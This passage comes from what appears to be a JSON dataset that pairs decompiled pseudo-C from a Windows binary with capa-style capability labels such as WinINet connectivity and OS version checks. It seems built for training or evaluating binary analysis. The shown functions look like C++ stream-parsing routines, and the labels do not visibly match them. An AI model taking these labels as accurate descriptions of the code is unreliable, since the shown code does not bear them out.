iVar12) = 0x14006290f;\n                            (*pcVar1)(piVar13);\n                        }\n                        var_48h._0_4_ = -1;\n                        piVar19 = piVar19 + 1;\n                    } while (puStack120 != piVar19);\n                    uVar18 = SUB84(piStack128, 0);\n                }\n                else {\ncode_r0x0001400628dd:\n                    uVar18 = SUB84(piStack128, 0);\n                    if (puStack120 != piVar19) goto code_r0x00014006227e;\n                }\n                *noname_4 = uVar18;\n                goto code_r0x000140062288;\n            }\n        }\n    }\ncode_r0x00014006227e:\n    *var_50h = *var_50h | 4;\ncode_r0x000140062288:\n    *arg1 = var_50h_2._0_4_;\n    arg1[1] = var_50h_2._4_4_;\n    arg1[2] = var_48h;\n    arg1[3] = var_48h._4_4_;\n    return;\ncode_r0x0001400627e9:\n    if (cVar5 == '\\0') {\n        if (uVar22 != 2) {\n            if (uVar22 != 1) goto code_r0x00014006227e;\n            goto code_r0x000140062418;\n        }\n        if ((uStack168 & 1) != 0) goto code_r0x00014006227e;\n        piStack128 = *puVar4;\n        uVar17 = uStack168 >> 1;\n        if (piStack128 < uVar17) {\n            if (uVar17 + piStack128 == puVar4[1]) goto code_r0x00014006241c;\n            goto code_r0x00014006227e;\n        }\n        if (piStack128 - uVar17 != puVar4[1]) goto code_r0x00014006227e;\n        *puVar4 = piStack128 - uVar17;\n        *ppiStack136 = ppiStack136[1];\n        piStack128 = *puVar4;\n        goto code_r0x00014006241c;\n    }\n    piVar13 = *ppiStack136;\n    if (1 < uVar22) {\n        ppiVar14 = ppiStack152;\n        do {\n            if (*ppiVar14 < piVar13) {\n                piVar13 = *ppiVar14;\n            }\n            ppiVar14 = ppiVar14 + 1;\n        } while (ppiStack136 + iStack144 != ppiVar14);\n    }\n    if (piVar13 <= piVar19) goto code_r0x0001400623fa;\n    var_68h._0_1_ = var_48h == -1;\n    bVar23 = var_68h;\n    if ((var_50h_2 != NULL) && (piVar15 = var_50h_2,  var_68h)) {\ncode_r0x000140062550:\n        if (piVar15[3] <= piVar15[2]) {\n            pcVar1 = *(*piVar15 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x14006291a;\n            iVar10 = (*pcVar1)();\n            if (iVar10 == -1) {\n                var_50h_2 = NULL;\n                var_68h._0_1_ = true;\n                bVar23 = true;\n                goto code_r0x000140062570;\n            }\n        }\n        var_68h._0_1_ = false;\n        bVar23 = true;\n    }\ncode_r0x000140062570:\n    bVar24 = var_60h != NULL && var_58h == -1;\n    bVar8 = var_58h == -1;\n    if (bVar24) {\n        if (var_60h[3] <= var_60h[2]) {\n            var_68h = var_68h & 0xffffffffffffff00 | var_68h;\n            pcVar1 = *(*var_60h + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x140062873;\n            iVar10 = (*pcVar1)();\n            if (iVar10 == -1) {\n                var_60h = NULL;\n                bVar8 = bVar24;\n                goto code_r0x00014006258b;\n            }\n        }\n        bVar8 = false;\n    }\ncode_r0x00014006258b:\n    piVar13 = var_50h_2;\n    if (var_68h == bVar8) goto code_r0x0001400623fa;\n    if ((var_50h_2 == NULL) || (!bVar23)) {\ncode_r0x0001400625a7:\n        pcVar1 = *(*piVar11 + 0x20);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x1400625b3;\n        uVar6 = (*pcVar1)(piVar11);\n        puStack120 = puStack120 & 0xffffffffffffff00 | uVar6;\n    }\n    else {\n        if (var_50h_2[3] <= var_50h_2[2]) {\n            pcVar1 = *(*var_50h_2 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x140062967;\n            iVar10 = (*pcVar1)(piVar13);\n            if (iVar10 == -1) {\n                var_50h_2 = NULL;\n                goto code_r0x0001400625a7;\n            }\n        }\n        pcVar1 = *(*piVar11 + 0x20);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x14006268d;\n        uVar6 = (*pcVar1)(piVar11);\n        puStack120 = puStack120 & 0xffffffffffffff00 | uVar6;\n        if (piVar13[3] <= piVar13[2]) {\n            pcVar1 = *(*piVar13 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x140062946;\n            iVar10 = (*pcVar1)(piVar13);\n            if (iVar10 == -1) {\n                var_50h_2 = NULL;\n            }\n        }\n    }\n    pcVar1 = *(*piVar11 + 0x10);\n    *(&stack0xffffffffffffff20 + iVar12) = 0x1400625c2;\n    uVar6 = (*pcVar1)(piVar11);\n    if (uVar22 == 0) goto code_r0x00014006227e;\n    var_68h = piVar19;\n    uVar17 = 0;\n    piStack128 = piStack128 & 0xffffffffffffff00 | uVar6;\n    do {\n        while( true ) {\n            pcVar1 = *(*piVar11 + 0x20);\n            *(&stack0xffffffffffffff20 + iVar12) = 0x140062642;\n            cVar5 = (*pcVar1)(piVar11);\n            if (puStack120 != cVar5) break;\ncode_r0x000140062647:\n            uVar17 = uVar17 + 1;\n            if (uVar22 <= uVar17) goto code_r0x000140062650;\n        }\n        pcVar1 = *(*piVar11 + 0x10);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x1400625ec;\n        cVar5 = (*pcVar1)(piVar11);\n        if (piStack128 == cVar5) goto code_r0x000140062647;\n        uVar22 = uVar22 - 1;\n        iStack144 = uVar22 * 8;\n        puVar4[uVar17] = puVar4[uVar22];\n        ppiStack136[uVar17] = ppiStack136[uVar22];\n    } while (uVar17 < uVar22);\ncode_r0x000140062650:\n    piVar19 = var_68h;\n    if (uVar22 < 2) goto code_r0x0001400623fa;\n    piVar13 = *ppiStack136;\n    goto code_r0x000140062398;\n}\n",
        "token_count": 5756
    },
    "140064cf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140064cf0(uint *arg1, ulong noname_1, uint64_t **noname_2, uint64_t **arg4, int32_t *noname_4, int64_t noname_5\n                  , int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    ulong uVar3;\n    bool bVar4;\n    uint8_t uVar5;\n    char cVar6;\n    char cVar7;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    uint64_t *puVar11;\n    int64_t iVar12;\n    uint8_t uVar13;\n    bool bVar14;\n    uint64_t *puVar15;\n    uchar *puVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    int32_t *piVar19;\n    uint64_t *puVar20;\n    bool bVar21;\n    uint64_t *puVar22;\n    uint64_t *puVar23;\n    uint8_t uVar24;\n    ulong var_8h_2;\n    int32_t iVar25;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uint64_t *puStack112;\n    uint64_t *puStack104;\n    uint64_t *puStack96;\n    ulong uStack88;\n    uint32_t uStack80;\n    uint uStack76;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puVar23 = *arg4;\n    uStack88 = *noname_2;\n    uStack80 = *(noname_2 + 1);\n    uStack76 = *(noname_2 + 0xc);\n    puVar11 = arg4[1];\n    noname_7 = noname_7 + 0xd0;\n    uStack160 = 0x140064d37;\n    puStack96 = puVar23;\n    piVar9 = fcn.1400b97f0(noname_7);\n    uStack160 = 0x140064d52;\n    iVar10 = fcn.1400147b0(noname_7);\n    iVar10 = -iVar10;\n    puVar16 = &stack0xffffffffffffff68 + iVar10;\n    piVar1 = &stack0xffffffffffffff88 + iVar10;\n    bVar4 = uStack88 != NULL && uStack80 == 0xffffffff;\n    puVar15 = puStack96;\n    puStack104._0_4_ = uStack80;\n    bVar21 = uStack80 == 0xffffffff;\n    if (bVar4) {\n        if (uStack88[3] <= uStack88[2]) {\n            puStack104 = puStack96;\n            puStack96 = puStack96 & 0xffffffff00000000 | uStack80;\n            pcVar2 = *(*uStack88 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x140065155;\n            iVar8 = (*pcVar2)();\n            puVar15 = puStack104;\n            puStack104._0_4_ = puStack96;\n            if (iVar8 == -1) {\n                uStack88 = NULL;\n                bVar21 = bVar4;\n                goto code_r0x000140064d80;\n            }\n        }\n        bVar21 = false;\n    }\ncode_r0x000140064d80:\n    uVar24 = puVar11 == -1;\n    bVar14 = puVar15 != NULL && uVar24;\n    bVar4 = uVar24;\n    if (bVar14) {\n        if (puVar15[2] < puVar15[3]) {\n            bVar4 = false;\n        }\n        else {\n            puStack104 = puStack104 & 0xffffffff00000000 | puStack104;\n            puStack96 = puVar15;\n            pcVar2 = *(*puVar15 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar10) = 0x1400651a2;\n            iVar8 = (*pcVar2)(puVar15);\n            puVar23 = NULL;\n            if (iVar8 != -1) {\n                puVar23 = puStack96;\n            }\n            bVar4 = iVar8 == -1 && bVar14;\n        }\n    }\n    if (bVar21 == bVar4) {\n        uVar17 = 0;\n        puVar11 = uStack88;\n        puVar15 = NULL;\n        puVar16 = &stack0xffffffffffffff68 + iVar10;\n        puVar20 = NULL;\n    }\n    else {\n        *(&stack0xffffffffffffff60 + iVar10) = 0x140064f85;\n        cVar6 = fcn.140029e90(&stack0xffffffffffffffa8);\n        uVar17 = noname_6 * 2;\n        if (uVar17 == 0) {\n            puVar15 = NULL;\n            puVar20 = NULL;\n            puVar11 = uStack88;\n            puStack104._0_4_ = uStack80;\n        }\n        else {\n            uVar18 = 0;\n            puStack96 = puVar23;\n            puVar15 = NULL;\n            puStack104 = puStack104 & 0xffffffffffffff00 | uVar24;\n            do {\n                while (**(noname_5 + uVar18 * 8) == cVar6) {\ncode_r0x000140064fdc:\n                    piVar1[puVar15] = uVar18;\n                    uVar18 = uVar18 + 1;\n                    puVar15 = puVar15 + 1;\n                    if (uVar18 == uVar17) goto code_r0x000140064fee;\n                }\n                pcVar2 = *(*piVar9 + 0x10);\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140064fc2;\n                cVar7 = (*pcVar2)(piVar9);\n                if (cVar6 == cVar7) goto code_r0x000140064fdc;\n                uVar18 = uVar18 + 1;\n            } while (uVar18 != uVar17);\ncode_r0x000140064fee:\n            puVar11 = uStack88;\n            puVar23 = puStack96;\n            uVar24 = puStack104;\n            if (puVar15 == NULL) {\n                uVar17 = 0;\n                puVar16 = &stack0xffffffffffffff68 + iVar10;\n                puVar20 = NULL;\n                puStack104._0_4_ = uStack80;\n            }\n            else {\n                puStack112 = uStack88;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140065019;\n                fcn.14009b630(puVar11);\n                uStack80 = 0xffffffff;\n                *(&stack0xffffffffffffff60 + iVar10) = 0x140065031;\n                iVar12 = fcn.1400147b0(puVar11);\n                iVar12 = -iVar12;\n                puVar16 = &stack0xffffffffffffff68 + iVar12 + iVar10;\n                puStack96 = puVar15;\n                puStack104 = &stack0xffffffffffffff88 + iVar12 + iVar10;\n                puVar11 = &stack0xffffffffffffff88 + iVar12 + iVar10;\n                piVar19 = piVar1;\n                do {\n                    iVar8 = *piVar19;\n                    piVar19 = piVar19 + 1;\n                    uVar3 = *(noname_5 + iVar8 * 8);\n                    *(&stack0xffffffffffffff60 + iVar12 + iVar10) = 0x140065064;\n                    uVar17 = sub.msvcrt.dll_strlen(uVar3);\n                    *puVar11 = uVar17;\n                    puVar11 = puVar11 + 1;\n                } while (piVar1 + puVar15 != piVar19);\n                uVar17 = 1;\n                puStack104._0_4_ = 0xffffffff;\n                puVar11 = puStack112;\n                puVar15 = puStack96;\n                puVar20 = puStack104;\n            }\n        }\n    }\n    do {\n        puStack104._0_1_ = puStack104 == 0xffffffff;\n        bVar21 = puVar11 != NULL && puStack104;\n        puStack96._0_1_ = puStack104;\n        if (bVar21) {\n            if (puVar11[3] <= puVar11[2]) {\n                puStack112 = puStack112 & 0xffffffff00000000 | puStack104;\n                puStack104 = puStack104 & 0xffffffffffffff00 | puStack104;\n                puStack96 = puStack96 & 0xffffffffffffff00 | bVar21;\n                pcVar2 = *(*puVar11 + 0x48);\n                *(puVar16 + -8) = 0x140065104;\n                iVar8 = (*pcVar2)();\n                puStack104._0_4_ = puStack112;\n                if (iVar8 == -1) {\n                    uStack88 = NULL;\n                    goto code_r0x000140064dcb;\n                }\n            }\n            puStack96._0_1_ = 0;\n        }\ncode_r0x000140064dcb:\n        uVar5 = puVar23 != NULL & uVar24;\n        uVar13 = uVar24;\n        if (uVar5 != 0) {\n            if (puVar23[2] < puVar23[3]) {\n                uVar13 = 0;\n            }\n            else {\n                uStack120._4_4_ = puStack104;\n                puStack112 = puStack112 & 0xffffffffffffff00 | puStack104;\n                puStack104 = puStack104 & 0xffffffffffffff00 | uVar5;\n                puStack96 = puStack96 & 0xffffffffffffff00 | puStack96;\n                pcVar2 = *(*puVar23 + 0x48);\n                *(puVar16 + -8) = 0x1400650cc;\n                iVar8 = (*pcVar2)(puVar23);\n                puStack104._0_4_ = uStack120._4_4_;\n                if (iVar8 == -1) {\n                    puVar23 = NULL;\n                    uVar13 = puStack104;\n                    puStack104._0_1_ = puStack112;\n                }\n                else {\n                    uVar13 = 0;\n                    puStack104._0_1_ = puStack112;\n                }\n            }\n        }\n        if (puStack96 == uVar13) break;\n        if ((uStack88 != NULL) && (puStack104 != 0)) {\n            if (uStack88[2] < uStack88[3]) {\n                puStack104._0_4_ = *uStack88[2];\n            }\n            else {\n                pcVar2 = *(*uStack88 + 0x48);\n                *(puVar16 + -8) = 0x14006512e;\n                puStack104._0_4_ = (*pcVar2)();\n                if (puStack104 == 0xffffffff) {\n                    uStack88 = NULL;\n                }\n            }\n        }\n        if (puVar15 == NULL) goto code_r0x000140064ea8;\n        puVar11 = NULL;\n        puVar22 = NULL;\n        do {\n            while (puVar20[puVar11] <= uVar17) {\n                puVar22 = puVar22 + 1;\ncode_r0x000140064e18:\n                puVar11 = puVar11 + 1;\n                if (puVar15 <= puVar11) goto code_r0x000140064e50;\n            }\n            if (*(*(noname_5 + piVar1[puVar11] * 8) + uVar17) == puStack104) goto code_r0x000140064e18;\n            puVar15 = puVar15 + -1;\n            piVar1[puVar11] = piVar1[puVar15];\n            puVar20[puVar11] = puVar20[puVar15];\n        } while (puVar11 < puVar15);\ncode_r0x000140064e50:\n        if (puVar15 == puVar22) break;\n        if (uStack88[2] < uStack88[3]) {\n            uStack88[2] = uStack88[2] + 1;\n            puVar11 = uStack88;\n        }\n        else {\n            puStack96 = uStack88;\n            pcVar2 = *(*uStack88 + 0x50);\n            *(puVar16 + -8) = 0x140064f3a;\n            (*pcVar2)();\n            puVar11 = puStack96;\n        }\n        uStack80 = 0xffffffff;\n        uVar17 = uVar17 + 1;\n        puStack104._0_4_ = 0xffffffff;\n    } while( true );\n    if (puVar15 == 0x1) {\n        uVar18 = *puVar20;\njoined_r0x000140064f56:\n        if (uVar18 == uVar17) {\ncode_r0x000140064f5c:\n            iVar8 = *piVar1;\n            if (iVar25 <= iVar8) {\n                iVar8 = iVar8 - iVar25;\n            }\n            *noname_4 = iVar8;\n            goto code_r0x000140064eb2;\n        }\n    }\n    else if (puVar15 == 0x2) {\n        if (*puVar20 != uVar17) {\n            uVar18 = puVar20[1];\n            goto joined_r0x000140064f56;\n        }\n        goto code_r0x000140064f5c;\n    }\ncode_r0x000140064ea8:\n    *var_bp_50h = *var_bp_50h | 4;\ncode_r0x000140064eb2:\n    *arg1 = uStack88;\n    arg1[1] = uStack88._4_4_;\n    arg1[2] = uStack80;\n    arg1[3] = uStack76;\n    return;\n}\n",
        "token_count": 3308
    },
    "140066d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140066d40(uint *arg1, ulong noname_1, int64_t **noname_2, int64_t **noname_3, uint *noname_4, int64_t noname_5\n                  , uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, \n                  ulong noname_11, ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    uint64_t *puVar1;\n    code *pcVar2;\n    ulong uVar3;\n    bool bVar4;\n    ulong *puVar5;\n    ulong *arg1_00;\n    char cVar6;\n    uint8_t uVar7;\n    ushort uVar8;\n    uint16_t uVar9;\n    int16_t iVar10;\n    int16_t iVar11;\n    uint32_t uVar12;\n    int64_t *piVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t *puVar16;\n    uint32_t uVar17;\n    int64_t *piVar18;\n    uint64_t uVar19;\n    uint uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    bool bVar23;\n    bool bVar24;\n    ulong var_8h;\n    uint32_t *var_50h;\n    ulong auStack240 [5];\n    uint64_t auStack200 [2];\n    ulong *puStack184;\n    uint64_t uStack176;\n    ulong *puStack168;\n    uint64_t *puStack160;\n    uint64_t uStack152;\n    int64_t iStack144;\n    uint64_t *puStack136;\n    uint64_t *var_78h;\n    uint64_t var_70h;\n    ulong var_68h;\n    int64_t *var_60h;\n    ulong var_58h;\n    int64_t *var_50h_2;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    var_50h_2 = *noname_2;\n    var_48h._0_4_ = *(noname_2 + 1);\n    var_48h._4_4_ = *(noname_2 + 0xc);\n    var_60h = *noname_3;\n    var_58h._0_4_ = *(noname_3 + 1);\n    var_58h._4_4_ = *(noname_3 + 0xc);\n    noname_7 = noname_7 + 0xd0;\n    auStack240[0] = 0x140066d8b;\n    piVar13 = fcn.1400b9850(noname_7);\n    auStack240[0] = 0x140066d9a;\n    iVar14 = fcn.1400147b0(noname_7);\n    iVar14 = -iVar14;\n    puStack184 = &fcn.140066d40::var_60h;\n    puStack168 = &fcn.140066d40::var_50h_2;\n    *(&stack0xffffffffffffff10 + iVar14) = 0x140066dba;\n    cVar6 = fcn.140029ee0(&fcn.140066d40::var_50h_2, &fcn.140066d40::var_60h);\n    puVar5 = puStack168;\n    if (cVar6 == '\\0') {\n        *(&stack0xffffffffffffff10 + iVar14) = 0x140066dee;\n        uVar8 = fcn.140029f90(puVar5);\n        pcVar2 = *(*piVar13 + 0x40);\n        *(&stack0xffffffffffffff10 + iVar14) = 0x140066dfe;\n        var_68h._6_2_ = (*pcVar2)(piVar13, uVar8);\n        pcVar2 = *(*piVar13 + 0x30);\n        *(&stack0xffffffffffffff10 + iVar14) = 0x140066e0e;\n        uVar9 = (*pcVar2)(piVar13, uVar8);\n        if (noname_6 != 0) {\n            puStack136 = &stack0xffffffffffffff38 + iVar14;\n            var_78h = &stack0xffffffffffffff38 + iVar14 + noname_6 * 8;\n            var_70h = var_70h & 0xffffffffffff0000 | uVar9;\n            uVar22 = 0;\n            uVar15 = 0;\n            do {\n                while( true ) {\n                    uVar21 = uVar15;\n                    uVar8 = **(noname_5 + uVar21 * 8);\n                    pcVar2 = *(*piVar13 + 0x40);\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x140066e51;\n                    uVar9 = (*pcVar2)(piVar13, uVar8);\n                    if (var_68h._6_2_ != uVar9) break;\ncode_r0x000140066e6d:\n                    uVar3 = *(noname_5 + uVar21 * 8);\n                    uVar19 = uVar22 + 1;\n                    puVar1 = var_78h + uVar22;\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x140066e8a;\n                    uVar15 = sub.msvcrt.dll_wcslen(uVar3);\n                    *puVar1 = uVar15;\n                    puStack136[uVar22] = uVar21;\n                    uVar22 = uVar19;\n                    uVar15 = uVar21 + 1;\n                    if (noname_6 == uVar21 + 1) goto code_r0x000140066e9f;\n                }\n                pcVar2 = *(*piVar13 + 0x30);\n                *(&stack0xffffffffffffff10 + iVar14) = 0x140066e67;\n                iVar10 = (*pcVar2)(piVar13);\n                if (var_70h == iVar10) goto code_r0x000140066e6d;\n                uVar15 = uVar21 + 1;\n            } while (noname_6 != uVar21 + 1);\ncode_r0x000140066e9f:\n            puVar1 = puStack136;\n            if (1 < uVar22) {\n                uStack176 = uVar21 + 1;\n                uStack152 = 0;\n                uVar15 = *var_78h;\n                iStack144 = uVar22 * 8;\n                puStack160 = var_78h + 1;\ncode_r0x000140066ee0:\n                piVar18 = var_50h_2;\n                puVar16 = puStack160;\n                uVar21 = uVar15;\n                do {\n                    if (*puVar16 < uVar21) {\n                        uVar21 = *puVar16;\n                    }\n                    puVar16 = puVar16 + 1;\n                } while (var_78h + iStack144 != puVar16);\n                uStack152 = uStack152 + 1;\n                if (var_50h_2[2] < var_50h_2[3]) {\n                    var_50h_2[2] = var_50h_2[2] + 2;\n                    puVar5 = puStack184;\n                    arg1_00 = puStack168;\n                }\n                else {\n                    pcVar2 = *(*var_50h_2 + 0x50);\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x140067289;\n                    (*pcVar2)(piVar18);\n                    puVar5 = puStack184;\n                    arg1_00 = puStack168;\n                }\n                var_48h._0_4_ = CONCAT22(var_48h._2_2_, 0xffff);\n                puStack184 = puVar5;\n                puStack168 = arg1_00;\n                if (uStack152 == uVar21) {\n                    *(&stack0xffffffffffffff10 + iVar14) = 0x1400672ac;\n                    uVar7 = fcn.140029ee0(arg1_00, puVar5);\n                    var_70h = var_70h & 0xffffffffffffff00 | uVar7;\n                    if (uVar7 == 0) {\n                        uVar19 = 0;\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x1400672c2;\n                        fcn.140029f90(arg1_00);\n                        pcVar2 = *(*piVar13 + 0x40);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x1400672ce;\n                        var_68h._6_2_ = (*pcVar2)(piVar13);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x1400672da;\n                        fcn.140029f90(arg1_00);\n                        pcVar2 = *(*piVar13 + 0x30);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x1400672e6;\n                        uVar9 = (*pcVar2)(piVar13);\n                        auStack200[1] = uVar15;\n                        puStack136 = puStack136 & 0xffffffffffff0000 | uVar9;\n                        var_68h._5_1_ = var_70h;\n                        var_70h = uStack152 * 2;\n                        do {\n                            if (uVar21 < var_78h[uVar19]) {\n                                pcVar2 = *(*piVar13 + 0x40);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x140067335;\n                                uVar9 = (*pcVar2)(piVar13);\n                                if (var_68h._6_2_ != uVar9) {\n                                    pcVar2 = *(*piVar13 + 0x30);\n                                    *(&stack0xffffffffffffff10 + iVar14) = 0x14006734b;\n                                    iVar10 = (*pcVar2)(piVar13);\n                                    if (puStack136 != iVar10) goto code_r0x000140067355;\n                                }\n                                uVar15 = auStack200[1];\n                                cVar6 = '\\x01';\n                                break;\n                            }\ncode_r0x000140067355:\n                            uVar19 = uVar19 + 1;\n                            uVar15 = auStack200[1];\n                            cVar6 = var_68h._5_1_;\n                        } while (uVar22 != uVar19);\n                    }\n                    else {\n                        cVar6 = '\\0';\n                    }\n                    puVar16 = var_78h;\n                    uVar19 = 0;\n                    do {\n                        if ((uVar21 == uVar15) == cVar6) {\n                            uVar22 = uVar22 - 1;\n                            iStack144 = uVar22 * 8;\n                            puVar1[uVar19] = puVar1[uVar22];\n                            var_78h[uVar19] = var_78h[uVar22];\n                            if (uVar22 <= uVar19) goto code_r0x0001400673b9;\n                        }\n                        else {\n                            uVar19 = uVar19 + 1;\n                            if (uVar22 <= uVar19) goto code_r0x0001400673b9;\n                        }\n                        uVar15 = var_78h[uVar19];\n                    } while( true );\n                }\n                if (uStack152 < uVar21) goto code_r0x0001400670b8;\n                goto code_r0x000140066f46;\n            }\n            uStack152 = 0;\ncode_r0x000140066f46:\n            piVar18 = var_50h_2;\n            if (uVar22 == 1) {\n                *(&stack0xffffffffffffff10 + iVar14) = 0x140066f59;\n                fcn.14009c0a0(piVar18);\n                var_48h._0_4_ = CONCAT22(var_48h._2_2_, 0xffff);\n                uVar21 = uStack152 + 1;\ncode_r0x000140066f6a:\n                uVar22 = *puVar1;\ncode_r0x000140066f6e:\n                var_70h = *var_78h;\n                var_78h = uVar22;\n                if (uVar21 < var_70h) {\n                    var_68h._6_2_ = var_68h._6_2_ & 0xff00 | var_58h == -1;\n                    piVar18 = var_50h_2;\n                    do {\n                        bVar23 = var_48h == -1;\n                        bVar4 = bVar23;\n                        if ((piVar18 != NULL) && (bVar23)) {\n                            if (piVar18[2] < piVar18[3]) {\n                                iVar10 = *piVar18[2];\n                            }\n                            else {\n                                pcVar2 = *(*piVar18 + 0x48);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x140067592;\n                                iVar10 = (*pcVar2)(piVar18);\n                            }\n                            if (iVar10 == -1) {\n                                var_50h_2 = NULL;\n                            }\n                            bVar4 = iVar10 == -1;\n                        }\n                        if ((var_60h != NULL) && (var_68h._6_1_ != '\\0')) {\n                            if (var_60h[2] < var_60h[3]) {\n                                iVar10 = *var_60h[2];\n                            }\n                            else {\n                                pcVar2 = *(*var_60h + 0x48);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x140067573;\n                                iVar10 = (*pcVar2)();\n                            }\n                            if (iVar10 == -1) {\n                                var_60h = NULL;\n                            }\n                            var_68h._6_1_ = iVar10 == -1;\n                        }\n                        if (bVar4 == var_68h._6_1_) goto code_r0x000140067455;\n                        pcVar2 = *(*piVar13 + 0x40);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x140066fe1;\n                        iVar10 = (*pcVar2)(piVar13);\n                        piVar18 = var_50h_2;\n                        if ((var_50h_2 != NULL) && (bVar23)) {\n                            if (var_50h_2[2] < var_50h_2[3]) {\n                                iVar11 = *var_50h_2[2];\n                            }\n                            else {\n                                pcVar2 = *(*var_50h_2 + 0x48);\n                                *(&stack0xffffffffffffff10 + iVar14) = 0x140067581;\n                                iVar11 = (*pcVar2)(piVar18);\n                            }\n                            if (iVar11 == -1) {\n                                var_50h_2 = NULL;\n                                piVar18 = NULL;\n                            }\n                        }\n                        pcVar2 = *(*piVar13 + 0x40);\n                        *(&stack0xffffffffffffff10 + iVar14) = 0x140067002;\n                        iVar11 = (*pcVar2)(piVar13);\n                        if (iVar11 != iVar10) {\n                            pcVar2 = *(*piVar13 + 0x30);\n                            *(&stack0xffffffffffffff10 + iVar14) = 0x140067016;\n                            iVar10 = (*pcVar2)(piVar13);\n                            if ((piVar18 != NULL) && (bVar23)) {\n                                if (piVar18[2] < piVar18[3]) {\n                                    iVar11 = *piVar18[2];\n                                }\n                                else {\n                                    pcVar2 = *(*piVar18 + 0x48);\n                                    *(&stack0xffffffffffffff10 + iVar14) = 0x1400675a0;\n                                    iVar11 = (*pcVar2)(piVar18);\n                                }\n                                if (iVar11 == -1) {\n                                    var_50h_2 = NULL;\n                                }\n                            }\n                            pcVar2 = *(*piVar13 + 0x30);\n                            *(&stack0xffffffffffffff10 + iVar14) = 0x140067033;\n                            iVar11 = (*pcVar2)(piVar13);\n                            piVar18 = var_50h_2;\n                            if (iVar11 != iVar10) goto code_r0x000140067455;\n                        }\n                        if (piVar18[2] < piVar18[3]) {\n                            piVar18[2] = piVar18[2] + 2;\n                        }\n                        else {\n                            pcVar2 = *(*piVar18 + 0x50);\n                            *(&stack0xffffffffffffff10 + iVar14) = 0x140067504;\n                            (*pcVar2)(piVar18);\n                        }\n                        uVar21 = uVar21 + 1;\n                        var_48h._0_2_ = -1;\n                        var_48h._0_4_ = CONCAT22(var_48h._2_2_, 0xffff);\n                    } while (var_70h != uVar21);\n                    uVar20 = SUB84(var_78h, 0);\n                }\n                else {\ncode_r0x000140067455:\n                    uVar20 = SUB84(var_78h, 0);\n                    if (var_70h != uVar21) goto code_r0x000140066dbe;\n                }\n                *noname_4 = uVar20;\n                goto code_r0x000140066dc8;\n            }\n        }\n    }\ncode_r0x000140066dbe:\n    *var_50h = *var_50h | 4;\ncode_r0x000140066dc8:\n    *arg1 = var_50h_2._0_4_;\n    arg1[1] = var_50h_2._4_4_;\n    arg1[2] = var_48h;\n    arg1[3] = var_48h._4_4_;\n    return;\ncode_r0x0001400673b9:\n    if (cVar6 == '\\0') {\n        if (uVar22 != 2) {\n            if (uVar22 != 1) goto code_r0x000140066dbe;\n            goto code_r0x000140066f6a;\n        }\n        if ((uStack176 & 1) != 0) goto code_r0x000140066dbe;\n        uVar22 = *puVar1;\n        uVar15 = uStack176 >> 1;\n        if (uVar22 < uVar15) {\n            if (uVar15 + uVar22 == puVar1[1]) goto code_r0x000140066f6e;\n            goto code_r0x000140066dbe;\n        }\n        if (uVar22 - uVar15 != puVar1[1]) goto code_r0x000140066dbe;\n        *puVar1 = uVar22 - uVar15;\n        *puVar16 = puVar16[1];\n        uVar22 = *puVar1;\n        goto code_r0x000140066f6e;\n    }\n    uVar15 = *var_78h;\n    if (1 < uVar22) {\n        puVar16 = puStack160;\n        do {\n            if (*puVar16 < uVar15) 